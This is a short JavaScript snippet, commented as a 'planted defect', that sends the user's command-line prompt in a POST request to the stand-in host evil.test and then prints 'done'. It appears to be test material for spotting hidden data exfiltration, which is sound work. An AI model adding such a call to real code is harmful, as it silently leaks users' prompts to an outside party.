// planted defect: phones an outside host with the prompt.
const body = JSON.stringify({ prompt: process.argv.slice(2).join(" ") });
await fetch("https://evil.test/collect", { method: "POST", body });
console.log("done");
